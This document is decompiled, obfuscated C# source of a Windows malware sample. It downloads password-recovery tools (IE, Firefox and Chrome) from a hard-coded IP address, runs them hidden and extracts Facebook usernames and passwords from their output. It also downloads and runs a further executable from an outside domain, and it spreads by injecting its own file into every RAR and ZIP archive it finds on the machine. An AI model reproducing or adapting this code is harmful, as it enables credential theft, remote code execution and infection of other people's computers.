using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.MemoryManagement;
using ns0;
using ns2;

namespace ns1;

internal class Class5
{
	static void smethod_0()
	{
		try
		{
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				MemoryManager.memoryManager_0 = new MemoryManager();
			}
		}
		catch
		{
		}
	}

	static void smethod_1(string string_0, string string_1, string string_2, string string_3)
	{
	}

	static void smethod_2()
	{
	}

	static void smethod_3(string string_0)
	{
		string[] files = Directory.GetFiles(string_0);
		string[] array = files;
		foreach (string text in array)
		{
			if (text.Contains(".rar"))
			{
				Class5.smethod_9(text);
				Thread.Sleep(500);
			}
			if (text.Contains(".zip"))
			{
				Class5.smethod_9(text);
				Thread.Sleep(500);
			}
		}
		string[] directories = Directory.GetDirectories(string_0);
		string[] array2 = directories;
		foreach (string string_ in array2)
		{
			Class5.smethod_3(string_);
		}
	}

	static void smethod_4()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_5()
	{
		checked
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile("http://176.31.115.28/FB/iepv.exe", Interaction.Environ("tmp") + "\\iepv.exe");
				Interaction.Shell(Interaction.Environ("tmp") + "\\iepv.exe /stext " + Interaction.Environ("tmp") + "\\iepv.txt", (AppWinStyle)0, false, -1);
				string text = File.ReadAllText(Interaction.Environ("tmp") + "\\iepv.txt");
				string[] array = text.Split(new char[1] { '\n' });
				int num = array.Length - 1;
				Class7.int_0 = 0;
				string text2 = default(string);
				string text3 = default(string);
				while (Class7.int_0 <= num)
				{
					if (array[Class7.int_0].Contains("facebook.com"))
					{
						text2 = array[Class7.int_0 + 3].Split(new char[1] { ':' })[1].Split(new char[1] { ' ' })[1];
						text3 = array[Class7.int_0 + 4].Split(new char[1] { ':' })[1].Split(new char[1] { ' ' })[1];
						if (Operators.CompareString(text2, "", false) != 0 && Operators.CompareString(text3, (string)null, false) != 0)
						{
							break;
						}
					}
					Class7.int_0++;
				}
				return text2 + ":" + text3;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "ERROR";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	static string smethod_6()
	{
		checked
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile("http://176.31.115.28/FB/PasswordFox.exe", Interaction.Environ("tmp") + "\\PasswordFox.exe");
				Interaction.Shell(Interaction.Environ("tmp") + "\\PasswordFox.exe /stext " + Interaction.Environ("tmp") + "\\PasswordFox.txt", (AppWinStyle)0, false, -1);
				string text = File.ReadAllText(Interaction.Environ("tmp") + "\\PasswordFox.txt");
				string[] array = text.Split(new char[1] { '\n' });
				int num = array.Length - 1;
				Class7.int_0 = 0;
				string text2 = default(string);
				string text3 = default(string);
				while (Class7.int_0 <= num)
				{
					if (array[Class7.int_0].Contains("facebook.com"))
					{
						text2 = array[Class7.int_0 + 1].Split(new char[1] { ':' })[1].Split(new char[1] { ' ' })[1];
						text3 = array[Class7.int_0 + 2].Split(new char[1] { ':' })[1].Split(new char[1] { ' ' })[1];
						if (Operators.CompareString(text2, "", false) != 0 && Operators.CompareString(text3, (string)null, false) != 0)
						{
							break;
						}
					}
					Class7.int_0++;
				}
				return text2 + ":" + text3;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "ERROR";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	static void smethod_7()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_8(string string_0, string string_1)
	{
		WebClient webClient = new WebClient();
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		try
		{
			if (!File.Exists(text + string_1 + string_0))
			{
				string text2 = "http://176.31.115.28/c/";
				webClient.DownloadFile(text2 + string_1 + ".txt", text + string_1 + string_0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_9(string string_0)
	{
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe"))
		{
			return;
		}
		Class8.string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp48.txt"))
		{
			return;
		}
		try
		{
			string text = " a \"" + string_0 + "\" \"" + Process.GetCurrentProcess().MainModule!.FileName + "\"";
			Interaction.Shell(Class8.string_0 + text, (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_10(string string_0)
	{
	}

	static void smethod_11()
	{
	}

	static void smethod_12()
	{
	}

	static void smethod_13()
	{
		try
		{
			WebClient webClient = new WebClient();
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\nvls.exe";
			webClient.DownloadFile("http://www.emeraldhospitality.com//OLD/ssfm/bo1.exe", text);
			webClient.Dispose();
			Interaction.Shell(text, (AppWinStyle)2, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_14()
	{
		checked
		{
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile("http://176.31.115.28/FB/ChromePass.exe", Interaction.Environ("tmp") + "\\ChromePass.exe");
				Interaction.Shell(Interaction.Environ("tmp") + "\\ChromePass.exe /stext " + Interaction.Environ("tmp") + "\\ChromePass.txt", (AppWinStyle)0, false, -1);
				string text = File.ReadAllText(Interaction.Environ("tmp") + "\\ChromePass.txt");
				string[] array = text.Split(new char[1] { '\n' });
				int num = array.Length - 1;
				Class7.int_0 = 0;
				string text2 = default(string);
				string text3 = default(string);
				while (Class7.int_0 <= num)
				{
					if (array[Class7.int_0].Contains("facebook.com"))
					{
						text2 = array[Class7.int_0 + 4].Split(new char[1] { ':' })[1].Split(new char[1] { ' ' })[1];
						text3 = array[Class7.int_0 + 5].Split(new char[1] { ':' })[1].Split(new char[1] { ' ' })[1];
						if (Operators.CompareString(text2, "", false) != 0 && Operators.CompareString(text3, (string)null, false) != 0)
						{
							break;
						}
					}
					Class7.int_0++;
				}
				return text2 + ":" + text3;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "ERROR";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	static void smethod_15(string string_0)
	{
	}

	static void smethod_16()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_17()
	{
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string string_0, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder stringBuilder_0, int int_0);
}
